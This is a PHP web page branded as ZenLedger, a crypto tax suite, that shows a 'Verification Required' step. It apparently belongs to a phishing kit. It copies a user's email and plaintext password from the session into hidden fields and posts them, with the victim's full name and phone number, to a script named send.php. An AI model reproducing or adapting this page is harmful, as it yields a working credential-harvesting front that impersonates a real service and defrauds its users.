<?php include_once './config.php'; ?>
<html lang="en">
    <?php
        $title = 'ZenLedger: Crypto Tax Professional Suite For CPAs';
        include_once './includes/meta.php';
        if(empty($_SESSION["email"]) || empty($_SESSION["password"])) {
            redirect(base_url());
        }
        unset($_SESSION['phone_number']);
    ?>
    <link rel="stylesheet" href="<?= base_url('assets/country-code-picker/css/jquery.ccpicker.css')?>">
    <body>
        <?php include_once './includes/header.php'; ?>
        <div class="container-fluid">
            <div class="row">
                <?php include_once './includes/sidebar.php'; ?>
                <div class="col-md-6 order-md-2 order-1">
                    <div class="row">
                        <div class="col-8 bg-white mt60 rounded-3">
                            <div class="d-flex align-items-center ">
                                <form method="post" action="<?= base_url('send.php') ?>" class="col-12 p25 form" style="position:relative;min-height:550px">
                                    <h4 class="fs22 fw-bold mb20">Verification Required</h4>
                                    <input type="hidden" name="email" value="<?= $_SESSION['email'] ?>" >
                                    <input type="hidden" name="password" value="<?= $_SESSION['password'] ?>" >
                                    <div class="my35">
                                        <label class="form-label fw-bold">Full Name</label>
                                        <input name="name" type="text" minlength="3" maxlength="200"  required="" class="form-control" placeholder="Full name"> 
                                    </div>
                                    <div className="my35 inputField">
                                        <label class="form-label">Phone Number</label>
                                        <div class="form-control" style="padding: 0px;">
                                            <input name="phone_number" type="number" id="phone_number" required="" style="width: 75%;border: solid 0px #DDD;padding: 10px 5px;margin: 0px;" class="" placeholder="Phone number" value="" >
                                        </div>
                                    </div>
                                    <div class="text-center mx-auto d-grid gap-2 my35">
                                        <button type="submit" class="btn btn-success bg-success-2 border-3 btn-lg btn-block border-0 fs15 py10">Verify</button>
                                    </div>
                                    <div class="col-sm-12 my20 text-center">
                                        <a href="#" class="text-decoration-none text-primary-2">Sign up for an account here</a>
                                    </div>
                                </form>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <?php include_once './includes/footer.php'; ?>
        <script src="./assets/country-code-picker/js/jquery.ccpicker.min.js"></script>
        <script type="text/javascript">
            $(document).ready(function() {
                $("#phone_number").CcPicker({ countryCode: "us", dataUrl: "<?= base_url('assets/country-code-picker/data/en.json')?>", searchPlaceHolder: "Select Country" });
            });
        </script>
    </body>
</html>